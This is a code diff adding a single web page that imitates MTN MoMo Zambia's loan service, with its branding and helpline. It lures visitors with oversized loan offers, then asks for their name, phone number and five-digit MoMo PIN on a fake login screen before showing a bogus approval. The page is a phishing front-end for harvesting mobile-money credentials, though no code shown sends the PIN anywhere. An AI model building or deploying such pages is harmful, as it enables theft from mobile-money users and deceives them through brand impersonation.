@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MTN MoMo Loans - Application Portal</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+          },
+          colors: {
+            brand: {
+              navy: '#052b57',
+              navyDark: '#031c3b',
+              yellow: '#ffcc00',
+              yellowDark: '#e5b700',
+              yellowLight: '#fff9e6',
+              borderFocus: '#ffd233',
+              grayBg: '#f2f4f7',
+              grayLight: '#e4e7ec',
+              grayMuted: '#667085',
+              grayText: '#344054'
+            }
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    /* Custom range slider styling matching screenshots */
+    input[type=range] {
+      -webkit-appearance: none;
+      width: 100%;
+      background: transparent;
+    }
+    input[type=range]:focus {
+      outline: none;
+    }
+    input[type=range]::-webkit-slider-runnable-track {
+      width: 100%;
+      height: 6px;
+      cursor: pointer;
+      background: #e2e8f0;
+      border-radius: 9999px;
+    }
+    input[type=range]::-webkit-slider-thumb {
+      height: 20px;
+      width: 20px;
+      border-radius: 50%;
+      background: #ffcc00;
+      border: 3px solid #ffffff;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.25);
+      cursor: pointer;
+      -webkit-appearance: none;
+      margin-top: -7px;
+    }
+    input[type=range]::-moz-range-track {
+      width: 100%;
+      height: 6px;
+      cursor: pointer;
+      background: #e2e8f0;
+      border-radius: 9999px;
+    }
+    input[type=range]::-moz-range-thumb {
+      height: 20px;
+      width: 20px;
+      border-radius: 50%;
+      background: #ffcc00;
+      border: 3px solid #ffffff;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.25);
+      cursor: pointer;
+    }
+    /* Pin input focused state */
+    .pin-input.active {
+      border-color: #ffcc00;
+      box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.4);
+    }
+    /* Custom animation */
+    .fade-enter {
+      opacity: 0;
+      transform: translateY(6px);
+      animation: fadeIn 0.25s forwards cubic-bezier(0.16, 1, 0.3, 1);
+    }
+    @keyframes fadeIn {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+</head>
+<body class="bg-gray-100 font-sans text-gray-900 min-h-screen flex flex-col justify-between antialiased selection:bg-yellow-200">
+
+  <div class="w-full max-w-md mx-auto min-h-screen bg-[#f3f4f6] flex flex-col shadow-xl relative overflow-hidden">
+    
+    <!-- Top Header -->
+    <header id="app-header" class="bg-brand-navy text-white px-4 py-3 flex items-center justify-between shadow-md transition-all">
+      <button id="header-back-btn" onclick="handleBackAction()" class="flex items-center text-sm font-medium text-gray-200 hover:text-white transition-opacity">
+        <svg class="w-4 h-4 mr-1 stroke-current" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
+        </svg>
+        <span>Back</span>
+      </button>
+
+      <!-- Center Logo -->
+      <div class="flex flex-col items-center">
+        <div class="flex items-center space-x-1.5">
+          <div class="bg-brand-yellow text-brand-navy px-1.5 py-0.5 rounded font-black text-lg tracking-tighter shadow-sm flex items-center justify-center leading-none">
+            MM
+          </div>
+          <span id="logo-subtext" class="text-xs text-gray-200 font-medium tracking-tight">Loans</span>
+        </div>
+        <span id="header-sub-tag" class="text-[9px] text-gray-300 font-normal tracking-wide hidden">from MTN</span>
+      </div>
+
+      <!-- Hamburger Menu Icon -->
+      <button class="text-gray-200 hover:text-white p-1 rounded focus:outline-none" aria-label="Menu" onclick="toggleNoticeModal(true, 'Menu', 'MTN MoMo Financial Services Zambia. Helpline: 111 (Free) or 0966 000 111.')">
+        <svg class="w-6 h-6 stroke-current" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.2" d="M4 6h16M4 12h16M4 18h16" />
+        </svg>
+      </button>
+    </header>
+
+    <main class="flex-1 p-4 pb-10 overflow-y-auto">
+
+      <!-- STEP 0: Welcome & Interactive Loan Calculator -->
+      <section id="step-0" class="fade-enter">
+        <div class="bg-white rounded-2xl p-6 shadow-sm border border-gray-100 flex flex-col items-center text-center mt-2">
+          <h1 class="text-2xl font-extrabold text-brand-navy tracking-tight">Welcome to MTN MoMo</h1>
+          <p class="text-sm text-gray-500 mt-1 mb-5">Get loans easily through MTN MoMo</p>
+
+          <!-- Inner Calculator Container -->
+          <div class="w-full bg-slate-50 border border-slate-100 rounded-xl p-4 text-left shadow-inner">
+            <h2 class="text-sm font-bold text-gray-800 tracking-tight mb-3">Loan Calculator</h2>
+
+            <div class="flex justify-between items-center py-1">
+              <span class="text-xs font-medium text-gray-600">Amount</span>
+              <span id="calc-amount-display" class="text-sm font-extrabold text-yellow-500">ZMW 1,000,000</span>
+            </div>
+
+            <div class="flex justify-between items-center py-1 mb-2">
+              <span class="text-xs font-medium text-gray-600">Term</span>
+              <span id="calc-term-display" class="text-sm font-semibold text-yellow-500">48 Months</span>
+            </div>
+
+            <!-- Slider Element -->
+            <div class="py-2">
+              <input 
+                id="loan-amount-slider" 
+                type="range" 
+                min="500000" 
+                max="5000000" 
+                step="50000" 
+                value="1000000" 
+                oninput="updateCalculator(this.value)" 
+                class="w-full"
+              />
+              <div class="flex justify-between text-[11px] text-gray-500 font-medium mt-1">
+                <span>ZMW 500,000</span>
+                <span>ZMW 5,000,000</span>
+              </div>
+            </div>
+
+            <!-- Monthly Payment Box -->
+            <div class="mt-4 bg-white border border-gray-100 rounded-lg p-4 flex items-center justify-between shadow-xs">
+              <div class="text-xs font-medium text-gray-500 leading-tight">
+                Monthly<br>Payment
+              </div>
+              <div class="text-right">
+                <span class="block text-xs font-extrabold text-yellow-500 leading-none">ZMW</span>
+                <span id="calc-monthly-payment" class="text-2xl font-extrabold text-yellow-500">20,834</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Start Application Button -->
+          <button 
+            type="button" 
+            onclick="goToStep(1)" 
+            class="w-full mt-6 py-3.5 bg-brand-navy hover:bg-brand-navyDark active:scale-[0.99] text-white font-bold rounded-lg tracking-wider text-xs uppercase shadow transition-all duration-150">
+            START APPLICATION
+          </button>
+        </div>
+      </section>
+
+      <section id="step-1" class="hidden fade-enter">
+        <div class="bg-white rounded-2xl p-6 shadow-sm border border-gray-100 mt-2">
+          
+          <div class="text-center mb-5">
+            <h1 class="text-2xl font-bold text-brand-navy">Loan Application</h1>
+            <p class="text-xs text-gray-500 mt-0.5">Step 1 of 3</p>
+            
+            <!-- Progress Bar (1/3 active) -->
+            <div class="grid grid-cols-3 gap-2 mt-3 px-1">
+              <div class="h-1 bg-brand-yellow rounded-full"></div>
+              <div class="h-1 bg-gray-200 rounded-full"></div>
+              <div class="h-1 bg-gray-200 rounded-full"></div>
+            </div>
+          </div>
+
+          <form id="step-1-form" onsubmit="event.preventDefault(); goToStep(2);" class="space-y-4">
+            <!-- Loan Type -->
+            <div>
+              <label class="block text-xs font-semibold text-gray-700 mb-1">Loan Type</label>
+              <div class="relative">
+                <select id="loan-type-select" class="w-full bg-white border border-gray-300 rounded-lg px-3 py-2.5 text-sm text-gray-800 appearance-none focus:outline-none focus:border-brand-yellow focus:ring-1 focus:ring-brand-yellow font-medium">
+                  <option value="Business Loan" selected>Business Loan</option>
+                  <option value="Personal Loan">Personal Loan</option>
+                  <option value="Agriculture Loan">Agriculture Loan</option>
+                  <option value="SME Booster Loan">SME Booster Loan</option>
+                </select>
+                <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-3 text-gray-400">
+                  <svg class="w-4 h-4 fill-current" viewBox="0 0 20 20"><path d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"/></svg>
+                </div>
+              </div>
+            </div>
+
+            <!-- Loan Amount (ZMW) -->
+            <div>
+              <label class="block text-xs font-semibold text-gray-700 mb-1">Loan Amount (ZMW)</label>
+              <input 
+                type="number" 
+                id="loan-amount-input" 
+                required 
+                value="1000000"
+                class="w-full bg-white border border-gray-300 rounded-lg px-3 py-2.5 text-sm text-gray-800 focus:outline-none focus:border-brand-yellow focus:ring-1 focus:ring-brand-yellow font-medium"
+              />
+            </div>
+
+            <!-- Loan Term -->
+            <div>
+              <label class="block text-xs font-semibold text-gray-700 mb-1">Loan Term</label>
+              <div class="relative">
+                <select id="loan-term-select" class="w-full bg-white border border-gray-300 rounded-lg px-3 py-2.5 text-sm text-gray-800 appearance-none focus:outline-none focus:border-brand-yellow focus:ring-1 focus:ring-brand-yellow font-medium">
+                  <option value="12 Months">12 Months</option>
+                  <option value="24 Months">24 Months</option>
+                  <option value="36 Months">36 Months</option>
+                  <option value="48 Months" selected>48 Months</option>
+                  <option value="60 Months">60 Months</option>
+                </select>
+                <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-3 text-gray-400">
+                  <svg class="w-4 h-4 fill-current" viewBox="0 0 20 20"><path d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"/></svg>
+                </div>
+              </div>
+            </div>
+
+            <!-- Purpose of Loan -->
+            <div>
+              <label class="block text-xs font-semibold text-gray-700 mb-1">Purpose of Loan</label>
+              <textarea 
+                id="loan-purpose-input" 
+                rows="3" 
+                placeholder="Describe the purpose of your loan..." 
+                class="w-full bg-white border border-gray-300 rounded-lg p-3 text-sm text-gray-800 placeholder-gray-400 focus:outline-none focus:border-brand-yellow focus:ring-1 focus:ring-brand-yellow font-normal"
+              ></textarea>
+            </div>
+
+            <!-- Action Button -->
+            <div class="pt-3">
+              <button 
+                type="submit" 
+                class="w-full py-3.5 bg-brand-navy hover:bg-brand-navyDark active:scale-[0.99] text-white font-bold rounded-lg tracking-wider text-xs uppercase shadow transition-all duration-150">
+                NEXT STEP
+              </button>
+            </div>
+          </form>
+
+        </div>
+      </section>
+
+      <section id="step-2" class="hidden fade-enter">
+        <div class="bg-white rounded-2xl p-6 shadow-sm border border-gray-100 mt-2">
+          
+          <div class="text-center mb-5">
+            <h1 class="text-2xl font-bold text-brand-navy">Loan Application</h1>
+            <p class="text-xs text-gray-500 mt-0.5">Step 2 of 3</p>
+            
+            <!-- Progress Bar (2/3 active) -->
+            <div class="grid grid-cols-3 gap-2 mt-3 px-1">
+              <div class="h-1 bg-brand-yellow rounded-full"></div>
+              <div class="h-1 bg-brand-yellow rounded-full"></div>
+              <div class="h-1 bg-gray-200 rounded-full"></div>
+            </div>
+          </div>
+
+          <form id="step-2-form" onsubmit="event.preventDefault(); goToStep(3);" class="space-y-4">
+            <!-- First Name & Last Name Grid -->
+            <div class="grid grid-cols-2 gap-3">
+              <div>
+                <label class="block text-xs font-semibold text-gray-700 mb-1">First Name</label>
+                <input 
+                  type="text" 
+                  id="first-name-input" 
+                  required 
+                  value="Leo" 
+                  placeholder="First name"
+                  class="w-full bg-white border border-gray-300 rounded-lg px-3 py-2.5 text-sm text-gray-800 focus:outline-none focus:border-brand-yellow focus:ring-1 focus:ring-brand-yellow font-medium"
+                />
+              </div>
+              <div>
+                <label class="block text-xs font-semibold text-gray-700 mb-1">Last Name</label>
+                <input 
+                  type="text" 
+                  id="last-name-input" 
+                  required 
+                  value="Kesho" 
+                  placeholder="Last name"
+                  class="w-full bg-white border border-gray-300 rounded-lg px-3 py-2.5 text-sm text-gray-800 focus:outline-none focus:border-brand-yellow focus:ring-1 focus:ring-brand-yellow font-medium"
+                />
+              </div>
+            </div>
+
+            <!-- Zambia Phone Number with +260 badge -->
+            <div>
+              <label class="block text-xs font-semibold text-gray-700 mb-1">Phone Number (Zambia)</label>
+              <div class="flex items-center border border-gray-300 rounded-lg overflow-hidden focus-within:ring-2 focus-within:ring-brand-yellow focus-within:border-brand-yellow bg-slate-50">
+                <span class="bg-gray-100 text-gray-600 px-3.5 py-2.5 text-xs font-semibold border-r border-gray-300 select-none">
+                  +260
+                </span>
+                <input 
+                  type="tel" 
+                  id="phone-number-input" 
+                  required 
+                  value="712465385" 
+                  maxlength="10" 
+                  placeholder="712465385"
+                  class="w-full bg-transparent px-3 py-2.5 text-sm text-gray-800 focus:outline-none font-medium"
+                />
+              </div>
+              <p class="text-[11px] text-gray-400 mt-1 leading-snug">
+                10 digits without +260 prefix (e.g., 9671234567) (e.g., 670123456)
+              </p>
+            </div>
+
+            <!-- Two action buttons: BACK and NEXT STEP -->
+            <div class="grid grid-cols-2 gap-3 pt-3">
+              <button 
+                type="button" 
+                onclick="goToStep(1)" 
+                class="w-full py-3.5 bg-gray-200 hover:bg-gray-300 active:scale-[0.99] text-gray-700 font-bold rounded-lg tracking-wider text-xs uppercase transition-all duration-150">
+                BACK
+              </button>
+              <button 
+                type="submit" 
+                class="w-full py-3.5 bg-brand-navy hover:bg-brand-navyDark active:scale-[0.99] text-white font-bold rounded-lg tracking-wider text-xs uppercase shadow transition-all duration-150">
+                NEXT STEP
+              </button>
+            </div>
+          </form>
+
+        </div>
+      </section>
+
+      <section id="step-3" class="hidden fade-enter">
+        
+        <!-- Big MoMo Banner Card -->
+        <div class="bg-brand-navy rounded-2xl p-5 text-center text-white mb-4 shadow">
+          <div class="inline-flex bg-brand-yellow text-brand-navy p-2 rounded-xl font-black text-2xl tracking-tighter mb-2 shadow">
+            MM
+          </div>
+          <h2 class="text-xl font-bold tracking-tight text-white">MoMo</h2>
+          <p class="text-xs text-blue-200">Login via MTN MoMo</p>
+        </div>
+
+        <div class="bg-white rounded-2xl p-6 shadow-sm border border-gray-100">
+          <h1 class="text-lg font-bold text-center text-brand-navy mb-4">Login to MTN MoMo</h1>
+
+          <!-- Read-only / Editable Zambia Phone Number input -->
+          <div class="flex items-center border border-gray-200 rounded-lg overflow-hidden bg-slate-50 mb-5">
+            <span class="bg-gray-100 text-gray-600 px-3.5 py-2.5 text-xs font-semibold border-r border-gray-200 select-none">
+              +260
+            </span>
+            <input 
+              type="tel" 
+              id="momo-phone-display" 
+              class="w-full bg-transparent px-3 py-2.5 text-sm text-gray-800 font-semibold focus:outline-none" 
+              value="9671234567" 
+            />
+          </div>
+
+          <!-- PIN Entry Container -->
+          <div class="text-center mb-6">
+            <label class="block text-xs text-gray-500 font-medium mb-3">Enter your MoMo PIN (5 digits):</label>
+            
+            <div class="flex items-center justify-center space-x-2 relative">
+              <!-- 5 PIN digit inputs -->
+              <input type="password" maxlength="1" inputmode="numeric" class="pin-box w-10 h-12 text-center text-lg font-bold rounded-lg border border-gray-300 focus:outline-none transition-all" data-index="0" autofocus />
+              <input type="password" maxlength="1" inputmode="numeric" class="pin-box w-10 h-12 text-center text-lg font-bold rounded-lg border border-gray-300 focus:outline-none transition-all" data-index="1" />
+              <input type="password" maxlength="1" inputmode="numeric" class="pin-box w-10 h-12 text-center text-lg font-bold rounded-lg border border-gray-300 focus:outline-none transition-all" data-index="2" />
+              <input type="password" maxlength="1" inputmode="numeric" class="pin-box w-10 h-12 text-center text-lg font-bold rounded-lg border border-gray-300 focus:outline-none transition-all" data-index="3" />
+              <input type="password" maxlength="1" inputmode="numeric" class="pin-box w-10 h-12 text-center text-lg font-bold rounded-lg border border-gray-300 focus:outline-none transition-all" data-index="4" />
+
+              <!-- Eye Toggle visibility -->
+              <button 
+                type="button" 
+                onclick="togglePinVisibility()" 
+                id="pin-toggle-btn"
+                class="ml-1 p-1 text-gray-500 hover:text-gray-700" 
+                title="Toggle Visibility">
+                <svg id="eye-icon" class="w-5 h-5 fill-none stroke-current" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                </svg>
+              </button>
+
+              <!-- Clear PIN Button -->
+              <button 
+                type="button" 
+                onclick="clearPin()" 
+                class="p-1 text-gray-400 hover:text-gray-700" 
+                title="Clear">
+                <svg class="w-4 h-4 stroke-current" fill="none" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                </svg>
+              </button>
+            </div>
+          </div>
+
+          <!-- Submit / Login Button -->
+          <button 
+            id="login-btn" 
+            type="button" 
+            onclick="submitApplication()" 
+            disabled 
+            class="w-full py-3.5 bg-gray-200 text-gray-400 font-bold rounded-lg tracking-wider text-xs uppercase cursor-not-allowed transition-all">
+            LOGIN
+          </button>
+
+        </div>
+      </section>
+
+      <section id="step-4" class="hidden fade-enter">
+        <div class="bg-white rounded-2xl p-6 shadow-sm border border-gray-100 text-center mt-4">
+          <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4 text-green-600">
+            <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"></path>
+            </svg>
+          </div>
+          
+          <h2 class="text-xl font-extrabold text-brand-navy">Application Submitted!</h2>
+          <p class="text-xs text-gray-500 mt-1 mb-5">Your loan request has been routed to MTN MoMo Credit Services.</p>
+
+          <div class="bg-slate-50 border border-slate-200 rounded-xl p-4 text-left space-y-2 mb-6 text-xs">
+            <div class="flex justify-between py-1 border-b border-gray-200 pb-2">
+              <span class="text-gray-500">Applicant:</span>
+              <span id="summary-name" class="font-bold text-gray-800">Leo Kesho</span>
+            </div>
+            <div class="flex justify-between py-1 border-b border-gray-200 pb-2">
+              <span class="text-gray-500">Phone:</span>
+              <span id="summary-phone" class="font-bold text-gray-800">+260 712465385</span>
+            </div>
+            <div class="flex justify-between py-1 border-b border-gray-200 pb-2">
+              <span class="text-gray-500">Loan Type:</span>
+              <span id="summary-type" class="font-bold text-gray-800">Business Loan</span>
+            </div>
+            <div class="flex justify-between py-1 border-b border-gray-200 pb-2">
+              <span class="text-gray-500">Approved Amount:</span>
+              <span id="summary-amount" class="font-bold text-yellow-600">ZMW 1,000,000</span>
+            </div>
+            <div class="flex justify-between py-1">
+              <span class="text-gray-500">Term / Est. Payment:</span>
+              <span id="summary-term" class="font-bold text-gray-800">48 Months (ZMW 20,834/mo)</span>
+            </div>
+          </div>
+
+          <button 
+            type="button" 
+            onclick="goToStep(0)" 
+            class="w-full py-3.5 bg-brand-navy hover:bg-brand-navyDark active:scale-[0.99] text-white font-bold rounded-lg tracking-wider text-xs uppercase shadow transition-all duration-150">
+            APPLY FOR ANOTHER LOAN
+          </button>
+        </div>
+      </section>
+
+    </main>
+
+    <div class="w-full relative h-12 bg-transparent pointer-events-none overflow-hidden">
+      <div class="w-[120%] -ml-[10%] h-20 bg-brand-navy rounded-t-[100%] flex justify-center items-center">
+        <div class="mt-4 bg-brand-yellow text-brand-navy px-1.5 py-0.5 rounded text-[10px] font-black">
+          MM
+        </div>
+      </div>
+    </div>
+
+    <!-- Notification / Info Modal (no alerts used) -->
+    <div id="notice-modal" class="fixed inset-0 bg-black/50 z-50 hidden flex items-center justify-center p-4">
+      <div class="bg-white rounded-xl max-w-xs w-full p-5 shadow-2xl text-center">
+        <h3 id="modal-title" class="font-bold text-brand-navy text-base mb-2">Notification</h3>
+        <p id="modal-message" class="text-xs text-gray-600 mb-4 leading-relaxed"></p>
+        <button onclick="toggleNoticeModal(false)" class="w-full py-2 bg-brand-navy text-white text-xs font-semibold rounded-lg hover:bg-brand-navyDark">
+          Dismiss
+        </button>
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    // State store
+    let currentStep = 0;
+    let pinVisible = false;
+
+    const appState = {
+      loanAmount: 1000000,
+      loanTermMonths: 48,
+      loanType: 'Business Loan',
+      purpose: '',
+      firstName: 'Leo',
+      lastName: 'Kesho',
+      phoneNumber: '712465385',
+      momoPin: ''
+    };
+
+    // Calculate loan monthly payment (Simple interest estimation formula)
+    function calculateMonthly(amount, months) {
+      const annualRate = 0.05; // 5% baseline mock rate
+      const totalInterest = amount * (annualRate * (months / 12));
+      const totalAmount = amount + totalInterest;
+      return Math.round(totalAmount / months);
+    }
+
+    // Update Step 0 Calculator
+    function updateCalculator(val) {
+      const amount = parseInt(val, 10);
+      appState.loanAmount = amount;
+      document.getElementById('calc-amount-display').innerText = 'ZMW ' + amount.toLocaleString();
+      const monthly = calculateMonthly(amount, appState.loanTermMonths);
+      document.getElementById('calc-monthly-payment').innerText = monthly.toLocaleString();
+      
+      // Update form inputs to match
+      const loanAmountInput = document.getElementById('loan-amount-input');
+      if (loanAmountInput) loanAmountInput.value = amount;
+    }
+
+    // Step Switcher
+    function goToStep(stepNum) {
+      // Sync form values if navigating from steps
+      if (currentStep === 1) {
+        appState.loanType = document.getElementById('loan-type-select').value;
+        appState.loanAmount = parseInt(document.getElementById('loan-amount-input').value, 10) || appState.loanAmount;
+        appState.loanTermMonths = parseInt(document.getElementById('loan-term-select').value, 10) || 48;
+        appState.purpose = document.getElementById('loan-purpose-input').value;
+      } else if (currentStep === 2) {
+        appState.firstName = document.getElementById('first-name-input').value;
+        appState.lastName = document.getElementById('last-name-input').value;
+        appState.phoneNumber = document.getElementById('phone-number-input').value;
+        // propagate to step 3 phone display
+        document.getElementById('momo-phone-display').value = appState.phoneNumber;
+      }
+
+      // Hide all step sections
+      for (let i = 0; i <= 4; i++) {
+        const sec = document.getElementById(`step-${i}`);
+        if (sec) sec.classList.add('hidden');
+      }
+
+      // Show requested step
+      const targetSec = document.getElementById(`step-${stepNum}`);
+      if (targetSec) {
+        targetSec.classList.remove('hidden');
+      }
+
+      currentStep = stepNum;
+
+      // Adjust header elements based on active step
+      const headerSubTag = document.getElementById('header-sub-tag');
+      const logoSubtext = document.getElementById('logo-subtext');
+      const backBtn = document.getElementById('header-back-btn');
+
+      if (currentStep === 0) {
+        headerSubTag.classList.remove('hidden');
+        logoSubtext.classList.add('hidden');
+        backBtn.classList.add('opacity-0', 'pointer-events-none');
+      } else {
+        headerSubTag.classList.add('hidden');
+        logoSubtext.classList.remove('hidden');
+        backBtn.classList.remove('opacity-0', 'pointer-events-none');
+      }
+
+      // If at step 3, refocus first pin box
+      if (currentStep === 3) {
+        setTimeout(() => {
+          const firstPin = document.querySelector('.pin-box[data-index="0"]');
+          if (firstPin) firstPin.focus();
+        }, 150);
+      }
+
+      // If at step 4, fill summary
+      if (currentStep === 4) {
+        document.getElementById('summary-name').innerText = `${appState.firstName} ${appState.lastName}`;
+        document.getElementById('summary-phone').innerText = `+260 ${appState.phoneNumber}`;
+        document.getElementById('summary-type').innerText = appState.loanType;
+        document.getElementById('summary-amount').innerText = `ZMW ${appState.loanAmount.toLocaleString()}`;
+        const monthly = calculateMonthly(appState.loanAmount, appState.loanTermMonths);
+        document.getElementById('summary-term').innerText = `${appState.loanTermMonths} Months (ZMW ${monthly.toLocaleString()}/mo)`;
+      }
+
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    // Top Header Back Button Handler
+    function handleBackAction() {
+      if (currentStep > 0 && currentStep <= 3) {
+        goToStep(currentStep - 1);
+      } else if (currentStep === 4) {
+        goToStep(0);
+      }
+    }
+
+    // PIN boxes logic
+    const pinInputs = document.querySelectorAll('.pin-box');
+    const loginBtn = document.getElementById('login-btn');
+
+    pinInputs.forEach((input, index) => {
+      // Focus outline styling
+      input.addEventListener('focus', () => {
+        input.classList.add('active');
+        input.select();
+      });
+      input.addEventListener('blur', () => {
+        input.classList.remove('active');
+      });
+
+      // Handle key entry
+      input.addEventListener('input', (e) => {
+        const val = e.target.value.replace(/[^0-9]/g, '');
+        e.target.value = val;
+
+        if (val) {56
+          // Move to next pin input if available
+          if (index < pinInputs.length - 1) {
+            pinInputs[index + 1].focus();
+          }
+        }
+        checkPinComplete();
+      });
+
+      // Handle backspace navigation
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+          pinInputs[index - 1].focus();
+        }
+      });
+    });
+
+    function checkPinComplete() {
+      let pin = '';
+      pinInputs.forEach(i => pin += i.value);
+      appState.momoPin = pin;
+
+      if (pin.length === 5) {
+        loginBtn.disabled = false;
+        loginBtn.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
+        loginBtn.classList.add('bg-brand-navy', 'text-white', 'hover:bg-brand-navyDark', 'shadow');
+      } else {
+        loginBtn.disabled = true;
+        loginBtn.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
+        loginBtn.classList.remove('bg-brand-navy', 'text-white', 'hover:bg-brand-navyDark', 'shadow');
+      }
+    }
+
+    function togglePinVisibility() {
+      pinVisible = !pinVisible;
+      pinInputs.forEach(i => {
+        i.type = pinVisible ? 'text' : 'password';
+      });
+      const eyeIcon = document.getElementById('eye-icon');
+      if (pinVisible) {
+        eyeIcon.innerHTML = `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l18 18" />`;
+      } else {
+        eyeIcon.innerHTML = `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />`;
+      }
+    }
+
+    function clearPin() {
+      pinInputs.forEach(i => i.value = '');
+      pinInputs[0].focus();
+      checkPinComplete();
+    }
+
+    function submitApplication() {
+      if (appState.momoPin.length < 5) return;
+      
+      // Simulate authentication spinner
+      loginBtn.innerHTML = `
+        <span class="inline-flex items-center">
+          <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
+            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+          </svg>
+          AUTHENTICATING...
+        </span>`;
+      loginBtn.disabled = true;
+
+      setTimeout(() => {
+        loginBtn.innerHTML = 'LOGIN';
+        clearPin();
+        goToStep(4);
+      }, 1200);
+    }
+
+    // Modal Helper
+    function toggleNoticeModal(show, title = '', msg = '') {
+      const modal = document.getElementById('notice-modal');
+      if (show) {
+        document.getElementById('modal-title').innerText = title;
+        document.getElementById('modal-message').innerText = msg;
+        modal.classList.remove('hidden');
+      } else {
+        modal.classList.add('hidden');
+      }
+    }
+
+    // Initialize initial calculator state on loaad
+    document.addEventListener('DOMContentLoaded', () => {
+      updateCalculator(1000000);
+      goToStep(0);
+    });
+  </script>
+</body>
+</html>
